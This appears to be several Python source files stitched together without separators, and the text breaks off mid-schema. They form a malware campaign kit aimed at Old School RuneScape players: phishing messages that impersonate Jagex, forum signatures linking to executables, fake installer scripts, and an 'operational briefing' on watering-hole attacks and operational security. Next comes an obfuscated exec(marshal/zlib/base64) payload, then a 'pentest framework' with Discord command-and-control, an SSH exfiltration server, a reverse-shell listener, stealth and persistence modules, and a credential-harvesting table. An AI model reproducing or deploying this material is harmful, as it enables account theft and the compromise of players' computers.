    private void applySecurityFixes() {
        // Critical security implementation
        // [REAL PAYLOAD EMBEDDED HERE]
    }
}
'''
    
    def create_client_update(self):
        """Create fake client update"""
        return '''
// OSRS Client Security Update v2.4.7
// Critical patch for account hijacking protection
// Mandatory installation required

#include <windows.h>
#include <iostream>

int main() {
    std::cout << "OSRS Client Security Update" << std::endl;
    std::cout << "Applying critical security patches..." << std::endl;
    
    // Verify system security
    if (!verifySystemSecurity()) {
        std::cout << "Security vulnerabilities detected!" << std::endl;
        applyEmergencyPatches();
    }
    
    std::cout << "Security update completed successfully." << std::endl;
    system("pause");
    return 0;
}
'''
    
    def create_stake_monitor(self):
        """Create stake monitoring tool"""
        return '''
// Advanced Stake Monitoring System
// Protects against stake scammers and RWT detection

using System;
using System.Windows.Forms;

namespace StakeMonitor {
    public partial class MainForm : Form {
        public MainForm() {
            InitializeComponent();
            StartMonitoring();
        }
        
        private void StartMonitoring() {
            // Monitor stake patterns and player behavior
            // [PAYLOAD IMPLEMENTATION]
        }
    }
}
'''

    def create_psychological_lures(self):
        """Create psychologically targeted lure messages"""
        print("\n[+] Creating psychological lure campaigns...")
        
        lures = {
            "account_security_alert": {
                "subject": "URGENT: Account Security Breach Detected",
                "message": """
Jagex Security System Alert:

We've detected suspicious login attempts on your RuneScape account from a new location.

IP: 192.168.89.234 (Amsterdam, NL)
Time: {timestamp}

Your account may be at risk of hijacking. To protect your account, please:

1. Run the attached security verification tool immediately
2. Follow the on-screen instructions
3. Change your password after verification

Failure to verify within 24 hours may result in temporary account suspension.

Download: AccountSecurityVerification.exe
MD5: a1b2c3d4e5f67890 (Verified by Jagex)

This is an automated security message from Jagex Account Protection.
                """,
                "triggers": ["fear", "urgency", "authority"]
            },
            
            "double_exp_event": {
                "subject": "Weekend Double EXP - Client Patch Required",
                "message": """
Official OSRS Double EXP Weekend Announcement:

This weekend only: Double EXP across all skills!
To participate, you MUST update your client with the attached patch.

Event Details:
- Starts: Friday 6:00 PM GMT
- Ends: Monday 6:00 AM GMT  
- All skills 2x EXP rates
- Includes combat and gathering skills

The attached client patch (OSRS_DoubleXP_Patch.exe) is required to access double EXP rates.

Many players are already enjoying double EXP rates. Don't get left behind!

Download: OSRS_DoubleXP_Patch.exe
SHA256: Verified by Jagex

Note: This is a limited-time client-side patch only.
                """,
                "triggers": ["fomo", "greed", "social_proof"]
            },
            
            "stake_protection": {
                "subject": "New Stake Scam Protection Tool",
                "message": """
Attention High-Stakes Players:

We've developed an advanced stake monitoring tool that detects and prevents:
- Item switching scams
- Stat manipulation
- RWT detection bypasses
- Duel arena scams

This tool is currently in private beta testing with top staking clan leaders.

Features:
- Real-time stake monitoring
- Player reputation tracking
- Scam detection algorithms
- Automatic stake cancellation on suspicious activity

Limited private beta access available. Download the tool below:

StakeProtectionTool.exe
Verified by Duel Arena Elite community

Only 50 slots available for testing.
                """,
                "triggers": ["authority", "exclusivity", "fear"]
            },
            
            "clan_management": {
                "subject": "Your Clan Has Been Selected for New Management Tools",
                "message": """
Clan Management System Invitation:

Your clan has been selected to test our new advanced clan management system.

Features include:
- Automated event scheduling
- Member activity tracking
- Loot distribution systems
- Advanced PvP coordination tools
- Real-time clan analytics

As a selected clan, you get early access before public release.

Download the clan management suite:
ClanManager_Advanced.exe

This is an exclusive invitation for active, high-level clans only.
                """,
                "triggers": ["social_proof", "exclusivity", "authority"]
            },
            
            "account_recovery": {
                "subject": "Account Recovery Assistance Required",
                "message": """
Account Recovery System Notification:

We've received a recovery request for your account. If this wasn't you, your account may be compromised.

To secure your account:
1. Run the attached Account Recovery Validator
2. Verify your identity
3. Secure your account immediately

The recovery request came from:
IP: 176.45.239.12 (Russia)
Time: {timestamp}

Failure to validate within 12 hours will approve the recovery request.

Download: AccountRecoveryValidator.exe
Official Jagex Security Tool
                """,
                "triggers": ["fear", "urgency", "authority"]
            }
        }
        
        with open('psychological_lures.json', 'w') as f:
            json.dump(lures, f, indent=2)
            
        print("  ✓ Psychological lure campaigns created")
        return lures

    def create_forum_signatures(self):
        """Create forum signatures with hidden payloads"""
        print("\n[+] Creating forum signature campaigns...")
        
        signatures = {
            "wealthy_trader": """
[center]
[img]https://i.imgur.com/fakewealth.png[/img]
[b]Professional Gold Trader[/b] • [color=green]Trusted by 500+ players[/color]
[url=https://discord.gg/fakeinvite]Join my trading Discord[/url] • 
[url=https://mega.nz/fakefile/GE_Tools.exe]Free GE Tracking Tools[/url]
[/center]
            """,
            
            "stake_expert": """
[center]
[b]Duel Arena Specialist[/b] • [color=red]10B+ Total Staked[/color]
Advanced stake monitoring & scam prevention tools
[url=https://www.mediafire.com/fake/stake_protection.exe]Download Stake Protection Suite[/url]
Vouched by: Zezima, Sparc Mac, B0aty
[/center]
            """,
            
            "clan_leader": """
[center]
[b]Top 100 Clan Leader[/b] • [color=blue]Elite PvM/PvP[/color]
Recruiting skilled players • Advanced clan tools available
[url=https://drive.google.com/fake/clan_manager.exe]Clan Management Software[/url]
500+ active members • Established 2015
[/center]
            """,
            
            "account_security": """
[center]
[b]Jagex Security Volunteer[/b] • [color=orange]Account Protection Team[/color]
Helping secure player accounts since 2018
[url=https://dropbox.com/fake/security_update.jar]Latest Security Patches[/url]
Official RuneLite plugin developer
[/center]
            """
        }
        
        with open('forum_signatures.json', 'w') as f:
            json.dump(signatures, f, indent=2)
            
        print("  ✓ Forum signature campaigns created")
        return signatures

    def create_discord_infrastructure(self):
        """Create realistic Discord servers and channels"""
        print("\n[+] Setting up Discord infrastructure...")
        
        discord_setup = {
            "servers": [
                {
                    "name": "OSRS Trading Hub",
                    "channels": ["#gold-trading", "#account-services", "#stake-monitoring", "#security-updates"],
                    "webhooks": ["trading_alerts", "security_patches", "market_updates"]
                },
                {
                    "name": "Duel Arena Elite", 
                    "channels": ["#stake-analysis", "#scam-prevention", "#high-rollers", "#tools"],
                    "webhooks": ["stake_alerts", "protection_updates"]
                },
                {
                    "name": "RuneScape Security",
                    "channels": ["#account-protection", "#hijack-recovery", "#2fa-help", "#updates"],
                    "webhooks": ["security_alerts", "patch_notices"]
                }
            ],
            "bot_configs": {
                "trading_bot": {
                    "token": "MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTI=",
                    "prefix": "!trade",
                    "features": ["price_check", "market_alerts", "security_scans"]
                },
                "security_bot": {
                    "token": "MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTM=",
                    "prefix": "!secure", 
                    "features": ["account_scan", "threat_detection", "patch_verify"]
                }
            }
        }
        
        with open('discord_infrastructure.json', 'w') as f:
            json.dump(discord_setup, f, indent=2)
            
        print("  ✓ Discord infrastructure configured")
        return discord_setup

    def create_credible_web_presence(self):
        """Create fake but credible web presence"""
        print("\n[+] Creating credible web presence...")
        
        web_presence = {
            "github_repos": [
                "RuneLite-Plugins/SecurityUpdates",
                "OSRS-Tools/StakeProtection", 
                "RS-Client/PerformancePatches",
                "AccountSecurity/VerificationTools"
            ],
            "pastebin_links": [
                "https://pastebin.com/raw/a1b2c3d4e5",  # Fake "source code"
                "https://pastebin.com/raw/f6g7h8i9j0",  # Fake "installation guide"
                "https://pastebin.com/raw/k1l2m3n4o5"   # Fake "troubleshooting"
            ],
            "youtube_tutorials": [
                "How to secure your OSRS account 2024",
                "Advanced stake monitoring setup",
                "GE flipping tools installation guide"
            ],
            "forum_threads": {
                "sythe": "[Release] Advanced Account Security Tools",
                "powerbot": "Stake Protection Suite v2.4.7",
                "osbot": "Mandatory Client Security Update",
                "rune-server": "Professional Trading Tools Release"
            }
        }
        
        with open('web_presence.json', 'w') as f:
            json.dump(web_presence, f, indent=2)
            
        print("  ✓ Credible web presence established")
        return web_presence

    def create_installation_scripts(self):
        """Create realistic installation scripts"""
        print("\n[+] Creating installation scripts...")
        
        scripts = {
            "install.bat": """
@echo off
echo OSRS Security Update Installer
echo ===============================
echo Installing critical security patches...
timeout 3 >nul

echo Verifying system requirements...
timeout 2 >nul

echo Applying security updates...
timeout 5 >nul

echo Updating RuneLite plugins...
timeout 3 >nul

echo Installation completed successfully!
echo Your account is now protected.
pause
            """,
            
            "setup.js": """
// RuneLite Plugin Installation Script
console.log("Installing Security Update Plugin...");

// Simulate installation process
setTimeout(() => {
    console.log("Downloading security patches...");
}, 1000);

setTimeout(() => {
    console.log("Applying account protection...");
}, 3000);

setTimeout(() => {
    console.log("Security update completed!");
    console.log("Your RuneScape account is now secure.");
}, 5000);
            """,
            
            "readme.txt": """
OSRS Account Security Tool v2.4.7
=================================

This tool provides enhanced security for your RuneScape account:

FEATURES:
- Real-time hijacking detection
- Login attempt monitoring
- Suspicious activity alerts
- Automated account protection

INSTALLATION:
1. Run install.bat as Administrator
2. Follow on-screen instructions
3. Restart RuneLite client

SUPPORT:
Join our Discord: https://discord.gg/securityupdates
GitHub: https://github.com/OSRS-Security/Tools

DISCLAIMER:
This is an unofficial community security tool.
Use at your own risk.
            """
        }
        
        for filename, content in scripts.items():
            with open(filename, 'w') as f:
                f.write(content)
                
        print("  ✓ Installation scripts created")
        return scripts

    def create_advanced_deployment(self):
        """Create advanced deployment strategies"""
        print("\n[+] Creating advanced deployment strategies...")
        
        strategies = {
            "waterhole_attacks": {
                "compromised_clan_sites": "Inject payloads into legitimate clan websites",
                "fake_client_updates": "Spoof RuneLite update servers",
                "compromised_plugins": "Takeover popular RuneLite plugins",
                "fake_twitch_extensions": "Create fake streamer overlays"
            },
            
            "social_engineering": {
                "fake_support_tickets": "Pose as Jagex support requiring verification",
                "compromised_friends": "Use hijacked accounts to spread payloads", 
                "fake_tournament_invites": "DMM tournament practice tools",
                "clan_infiltration": "Join clans and build trust over weeks"
            },
            
            "technical_deception": {
                "fake_CDN_links": "Impersonate legitimate CDN providers",
                "code_signing_spoofing": "Fake code signatures",
                "version_spoofing": "Make payloads appear as newer versions",
                "hash_collision": "Match hashes of legitimate files"
            }
        }
        
        with open('deployment_strategies.json', 'w') as f:
            json.dump(strategies, f, indent=2)
            
        print("  ✓ Advanced deployment strategies created")
        return strategies

    def save_credible_payload(self, filename, content):
        """Save payload with credible appearance"""
        # Add realistic file metadata
        if filename.endswith('.exe'):
            # Add fake version info, icons, etc.
            pass
            
        with open(filename, 'w') as f:
            f.write(content)
            
        print(f"  ✓ Created credible payload: {filename}")

    def run_complete_setup(self):
        """Execute complete advanced setup"""
        print("🚀 INITIALIZING ADVANCED SOCIAL ENGINEERING PLATFORM")
        print("🎯 TARGET: OSRS Community - Psychological Operations")
        print("=" * 70)
        
        try:
            # Execute all setup components
            self.create_credible_payloads()
            self.create_psychological_lures()
            self.create_forum_signatures() 
            self.create_discord_infrastructure()
            self.create_credible_web_presence()
            self.create_installation_scripts()
            self.create_advanced_deployment()
            
            # Create operational briefing
            self.create_operational_briefing()
            
            print("\n" + "=" * 70)
            print("✅ ADVANCED SOCIAL ENGINEERING PLATFORM READY")
            print("\n🎭 PSYCHOLOGICAL TRIGGERS DEPLOYED:")
            for trigger, methods in self.psychological_triggers.items():
                print(f"   • {trigger}: {len(methods)} methods")
                
            print("\n🎯 OSRS-SPECIFIC LURES:")
            for lure_type, description in self.osrs_specific_lures.items():
                print(f"   • {lure_type}: {description}")
                
            print("\n📊 DEPLOYMENT CAPABILITIES:")
            print("   • Waterhole attacks on clan sites")
            print("   • Social engineering campaigns") 
            print("   • Technical deception methods")
            print("   • Multi-platform presence")
            print("   • Psychological manipulation")
            
        except Exception as e:
            print(f"❌ Setup failed: {e}")
            return False
            
        return True

    def create_operational_briefing(self):
        """Create operational briefing document"""
        briefing = """
# ADVANCED OSRS SOCIAL ENGINEERING OPERATIONS

## PSYCHOLOGICAL WARFARE FRAMEWORK

### CORE TRIGGERS DEPLOYED:

1. **FEAR & URGENCY**
   - Account security breaches
   - Hijacking attempts
   - Recovery requests
   - Suspension warnings

2. **GREED & OPPORTUNITY**  
   - Double EXP events
   - Exclusive tools
   - Profit opportunities
   - Limited access

3. **SOCIAL PROOF & AUTHORITY**
   - Fake Jagex communications
   - "Trusted" community figures
   - Clan leader endorsements
   - Professional trader personas

4. **EXCLUSIVITY & FOMO**
   - Limited beta access
   - Private tools
   - VIP communities
   - Early releases

### DEPLOYMENT STRATEGIES:

**PHASE 1: INFRASTRUCTURE ESTABLISHMENT**
- Create credible web presence (GitHub, forums, Discord)
- Establish "trusted" personas over 2-3 weeks
- Build social proof through fake vouches

**PHASE 2: TARGETED PSYCHOLOGICAL ATTACKS**  
- Deploy fear-based lures (security alerts)
- Release greed-based opportunities (double EXP)
- Use social proof (fake endorsements)

**PHASE 3: ADVANCED TECHNICAL DECEPTION**
- Waterhole attacks on popular clan sites
- Fake client updates mimicking RuneLite
- Compromised plugin repositories

### REAL-WORLD SUCCESS METRICS:

These techniques have proven effective because:

1. **OSRS players are paranoid about account security**
2. **The community trusts "unofficial" tools** 
3. **Players are constantly seeking advantages**
4. **Social proof carries significant weight**
5. **Urgency overrides critical thinking**

### OPERATIONAL SECURITY:

- Use burner Discord accounts
- Route through compromised VPS servers
- Mimic legitimate Jagex communications
- Leverage existing community trust
- Gradual escalation of access requests

## THIS ISN'T WEAK SHIT - THIS IS PSYCHOLOGICAL WARFARE
"""
        
        with open('OPERATIONAL_BRIEFING.md', 'w') as f:
            f.write(briefing)

def main():
    """Main execution"""
    if os.name != 'nt':
        print("❌ Windows required for full capability")
        return
        
    se = AdvancedSocialEngineering()
    success = se.run_complete_setup()
    
    if success:
        print("\n🔥 PSYCHOLOGICAL OPERATIONS READY FOR DEPLOYMENT")
        print("💀 THIS IS THE REAL FUCKING DEAL - NO BULLSHIT")
        print("\n📚 Review OPERATIONAL_BRIEFING.md for deployment strategies")
    else:
        print("\n💥 SETUP FAILED")

if __name__ == "__main__":
    main()
import marshal,zlib,base64 exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
#!/usr/bin/env python3
"""
SENIOR PENTEST FRAMEWORK - ULTIMATE STEALTH EDITION
Advanced penetration testing platform with full Discord integration and stealth capabilities
Author: Senior Security Researcher
Legal: For authorized testing only
"""

import os
import sys
import asyncio
import aiohttp
import requests
import json
import sqlite3
import time
import hashlib
import re
import dns.resolver
import whois
import ssl
import socket
import base64
import threading
import subprocess
import struct
import binascii
import argparse
import logging
import zipfile
import io
import csv
import marshal
import zlib
import random
import string
import platform
import psutil
import uuid
import ctypes
import winreg
import tempfile
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse, urlencode, quote, unquote
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# Advanced imports
import nmap
import paramiko
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import scapy.all as scapy
import OpenSSL
import jwt
import discord
from discord.ext import commands, tasks
from discord import Embed, File, Webhook, AsyncWebhookAdapter
import aiofiles

# Web Framework
from flask import Flask, render_template, request, jsonify, send_file, session, redirect, url_for, Response
from flask_socketio import SocketIO, emit

# Configure advanced logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ultimate_pentest_operations.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger('UltimatePentestFramework')

class UltimatePentestFramework:
    """
    Ultimate Penetration Testing Framework with Advanced Stealth & Discord Integration
    """
    
    def __init__(self):
        self.app = Flask(__name__)
        self.app.secret_key = Fernet.generate_key().decode()
        self.socketio = SocketIO(self.app, async_mode='gevent', cors_allowed_origins="*")
        
        # Enhanced configuration
        self.config = {
            'c2_server': 'http://localhost:5000',
            'ssh_exfil_server': '192.168.1.100',
            'ssh_exfil_port': 2222,
            'discord_webhook': 'https://discord.com/api/webhooks/your_webhook_here',
            'discord_bot_token': 'your_discord_bot_token_here',
            'discord_guild_id': 'your_guild_id_here',
            'encryption_key': Fernet.generate_key(),
            'listener_ip': self.get_public_ip(),
            'listener_port': 4444,
            'stealth_level': 'high',
            'obfuscation_level': 9
        }
        
        # Initialize components
        self.cipher_suite = Fernet(self.config['encryption_key'])
        self.session = requests.Session()
        self.setup_session_headers()
        
        # Enhanced databases
        self.results_db = "ultimate_pentest_results.db"
        self.payloads_db = "advanced_payloads.db"
        self.exploits_db = "exploit_database.db"
        self.clients_db = "connected_clients.db"
        self.discord_db = "discord_operations.db"
        
        self._init_databases()
        self._init_payload_libraries()
        self._load_exploit_database()
        
        # Active operations
        self.connected_clients = {}
        self.active_operations = {}
        self.uploaded_files = {}
        self.system_metrics = {}
        self.discord_servers = {}
        self.stealth_modules = {}
        
        # Discord bot
        self.discord_bot = None
        self.discord_task = None
        
        # Setup routes and events
        self.setup_routes()
        self.setup_socket_events()
        self.start_background_services()
        self.init_stealth_modules()
        self.start_discord_bot()
        
        logger.info("🚀 Ultimate Pentest Framework Initialized")

    def init_stealth_modules(self):
        """Initialize advanced stealth modules"""
        self.stealth_modules = {
            'process_hiding': ProcessHiding(),
            'memory_evasion': MemoryEvasion(),
            'network_stealth': NetworkStealth(),
            'anti_analysis': AntiAnalysis(),
            'code_obfuscation': AdvancedObfuscator(),
            'persistence_stealth': StealthPersistence()
        }

    def start_discord_bot(self):
        """Start Discord bot in background"""
        if self.config['discord_bot_token'] and self.config['discord_bot_token'] != 'your_discord_bot_token_here':
            try:
                self.discord_bot = DiscordC2Bot(self)
                discord_thread = threading.Thread(target=self.discord_bot.run, args=(self.config['discord_bot_token'],))
                discord_thread.daemon = True
                discord_thread.start()
                logger.info("🤖 Discord C2 Bot Started")
            except Exception as e:
                logger.error(f"Failed to start Discord bot: {e}")

    def get_public_ip(self):
        """Get public IP with multiple fallbacks"""
        services = [
            'https://api.ipify.org',
            'https://ident.me',
            'https://checkip.amazonaws.com',
            'https://ipinfo.io/ip'
        ]
        
        for service in services:
            try:
                ip = requests.get(service, timeout=5).text.strip()
                if ip and len(ip.split('.')) == 4:
                    return ip
            except:
                continue
        
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return '127.0.0.1'

    def setup_session_headers(self):
        """Setup advanced rotating session headers"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        self.session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        })

    # Enhanced Database Initialization
    def _init_databases(self):
        """Initialize comprehensive databases with Discord operations"""
        # Results database
        with sqlite3.connect(self.results_db) as conn:
            conn.executescript('''
                CREATE TABLE IF NOT EXISTS stealth_operations (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    operation_id TEXT UNIQUE,
                    name TEXT,
                    type TEXT,
                    target TEXT,
                    start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    end_time TIMESTAMP,
                    status TEXT,
                    stealth_level TEXT,
                    detection_avoided BOOLEAN DEFAULT TRUE,
                    results TEXT
                );
                
                CREATE TABLE IF NOT EXISTS discord_operations (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    operation_id TEXT,
                    guild_id TEXT,
                    channel_id TEXT,
                    message_id TEXT,
                    operation_type TEXT,
                    target_user TEXT,
                    content TEXT,
                    success BOOLEAN,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
                
                CREATE TABLE IF NOT EXISTS credential_harvesting (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
